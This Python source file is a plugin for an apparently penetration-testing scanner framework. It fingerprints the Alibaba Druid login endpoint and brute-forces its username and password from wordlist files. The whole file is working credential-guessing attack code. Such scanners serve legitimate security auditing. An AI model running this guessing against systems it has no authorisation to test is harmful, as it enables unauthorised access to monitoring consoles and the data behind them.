from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req
from xing.core import PluginType, SchemeType


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.BRUTE
        self.vul_name = "Alibaba Druid 弱口令"
        self.app_name = 'Alibaba Druid'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

        self.username_file = "username_alibaba-druid.txt"
        self.password_file = "password_alibaba-druid.txt"
        self.shuffle_auth_list = True

    def login(self, target, user, passwd):
        url = target + "/druid/submitLogin"
        login = {
            "loginUsername": user,
            "loginPassword": passwd
        }
        req = http_req(url, "post", data=login)

        if b'success' == req.content and req.status_code == 200:
            return True

    def check_app(self, target):
        url = target + "/druid/submitLogin"
        req = http_req(url, "post", data="test")

        if req.status_code != 200:
            return False
        if b'error' == req.content:
            return True
